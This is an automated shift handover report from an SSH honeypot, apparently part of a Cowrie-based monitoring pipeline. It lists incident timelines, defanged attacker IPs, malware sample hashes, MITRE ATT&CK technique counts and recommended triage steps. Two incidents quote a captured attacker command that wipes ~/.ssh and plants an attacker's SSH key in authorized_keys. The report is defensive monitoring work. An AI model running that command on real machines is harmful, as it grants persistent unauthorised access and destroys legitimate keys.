| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:30:25` | `cowrie.session.connect` |
| `2026-05-21 19:30:25` | `cowrie.client.version` |
| `2026-05-21 19:30:25` | `cowrie.client.kex` |
| `2026-05-21 19:30:26` | `cowrie.login.success` |
| `2026-05-21 19:30:26` | `cowrie.session.params` |
| `2026-05-21 19:30:26` | `cowrie.command.input` |
| `2026-05-21 19:30:26` | `cowrie.command.failed` |
| `2026-05-21 19:30:26` | `cowrie.log.closed` |
| `2026-05-21 19:30:26` | `cowrie.session.params` |
| `2026-05-21 19:30:26` | `cowrie.command.input` |
| `2026-05-21 19:30:26` | `cowrie.session.file_download` |
| `2026-05-21 19:30:26` | `cowrie.log.closed` |
| `2026-05-21 19:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e30cb753741

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 19:30 |
| **Last Seen** | 2026-05-21 19:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:30:27` | `cowrie.session.connect` |
| `2026-05-21 19:30:27` | `cowrie.client.version` |
| `2026-05-21 19:30:27` | `cowrie.client.kex` |
| `2026-05-21 19:30:27` | `cowrie.login.success` |
| `2026-05-21 19:30:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd905213e36c

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 19:56 |
| **Last Seen** | 2026-05-21 19:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:56:34` | `cowrie.session.connect` |
| `2026-05-21 19:56:34` | `cowrie.client.version` |
| `2026-05-21 19:56:34` | `cowrie.client.kex` |
| `2026-05-21 19:56:34` | `cowrie.login.success` |
| `2026-05-21 19:56:34` | `cowrie.session.params` |
| `2026-05-21 19:56:34` | `cowrie.command.input` |
| `2026-05-21 19:56:34` | `cowrie.command.failed` |
| `2026-05-21 19:56:34` | `cowrie.log.closed` |
| `2026-05-21 19:56:34` | `cowrie.session.params` |
| `2026-05-21 19:56:34` | `cowrie.command.input` |
| `2026-05-21 19:56:34` | `cowrie.session.file_download` |
| `2026-05-21 19:56:34` | `cowrie.log.closed` |
| `2026-05-21 19:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-924fab8ac66c

| Field | Detail |
|---|---|
| **Source IP** | `103.211.59[.]6` |
| **First Seen** | 2026-05-21 19:56 |
| **Last Seen** | 2026-05-21 19:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 19:56:35` | `cowrie.session.connect` |
| `2026-05-21 19:56:35` | `cowrie.client.version` |
| `2026-05-21 19:56:35` | `cowrie.client.kex` |
| `2026-05-21 19:56:36` | `cowrie.login.success` |
| `2026-05-21 19:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.59[.]6` to AbuseIPDB if not already reported
- [ ] Block `103.211.59[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.36.122[.]139` | **21** | 2026-05-21 18:12 | 2026-05-21 19:30 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.211.59[.]6` | **16** | 2026-05-21 18:17 | 2026-05-21 19:56 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `62.98.99[.]66` | **9** | 2026-05-21 16:41 | 2026-05-21 16:50 | 12m | 0 | `T1592` | 🟢 LOW |
| `176.88.159[.]180` | **5** | 2026-05-21 17:50 | 2026-05-21 17:52 | 10m | 0 | `T1592` | 🟢 LOW |
| `117.193.28[.]211` | **4** | 2026-05-21 18:14 | 2026-05-21 18:29 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `154.221.35[.]72` | **3** | 2026-05-21 18:17 | 2026-05-21 19:47 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `144.217.13[.]134` | **2** | 2026-05-21 17:58 | 2026-05-21 18:04 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `178.62.133[.]230` | **2** | 2026-05-21 19:53 | 2026-05-21 19:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.194[.]166` | **2** | 2026-05-21 19:45 | 2026-05-21 19:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]139` | **2** | 2026-05-21 17:32 | 2026-05-21 17:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.55[.]179` | 1 | 2026-05-21 18:03 | 2026-05-21 18:03 | 5s | 0 | `T1592` | 🟢 LOW |
| `101.176.22[.]141` | 1 | 2026-05-21 17:41 | 2026-05-21 17:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `115.190.26[.]243` | 1 | 2026-05-21 17:59 | 2026-05-21 18:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.104[.]37` | 1 | 2026-05-21 18:55 | 2026-05-21 18:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `12.156.67[.]18` | 1 | 2026-05-21 18:03 | 2026-05-21 18:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.26[.]185` | 1 | 2026-05-21 18:41 | 2026-05-21 18:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `168.138.213[.]115` | 1 | 2026-05-21 18:08 | 2026-05-21 18:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.220.244[.]134` | 1 | 2026-05-21 18:03 | 2026-05-21 18:03 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.43[.]90` | 1 | 2026-05-21 19:25 | 2026-05-21 19:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.98[.]12` | 1 | 2026-05-21 19:23 | 2026-05-21 19:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.180.59[.]208` | 1 | 2026-05-21 19:06 | 2026-05-21 19:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `212.118.52[.]213` | 1 | 2026-05-21 18:02 | 2026-05-21 18:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.233.160[.]171` | 1 | 2026-05-21 19:55 | 2026-05-21 19:55 | 13s | 0 | `T1592` | 🟢 LOW |
| `43.142.113[.]25` | 1 | 2026-05-21 17:25 | 2026-05-21 17:26 | 31s | 0 | `T1592` | 🟢 LOW |
| `59.98.148[.]5` | 1 | 2026-05-21 18:17 | 2026-05-21 18:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.219.249[.]135` | 1 | 2026-05-21 18:53 | 2026-05-21 18:53 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `178.62.133[.]230` | NL | DigitalOcean Amsterdam | **100** ⚠️ | 14 |
| `103.211.59[.]6` | IN | Precious netcom pvt ltd | **100** ⚠️ | 50 |
| `182.180.59[.]208` | PK | DSLAM Infrastructure South | **100** ⚠️ | 50 |
| `168.138.213[.]115` | JP | Oracle Public Cloud | **100** ⚠️ | 28 |
| `101.126.55[.]179` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.184.98[.]12` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 8 |
| `62.98.99[.]66` | IT | Wind Telecomunicazioni spa | **100** ⚠️ | 2 |
| `66.132.172[.]139` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `8.219.249[.]135` | SG | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 26 |
| `120.48.26[.]185` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 87 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 55 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 30 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 15 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 15 |

---

## 🔕 False Positive Summary (158 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 31 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 14 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 10 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 100 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 270 cases |
| Tool 34  | Credential Extractor        | ✅ 85 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 51 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 158 filtered (58.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 38 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 30 priority case(s) shown individually · 26 recon entry/entries in table (10 group(s) consolidating 66 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-21T19:58:57Z_
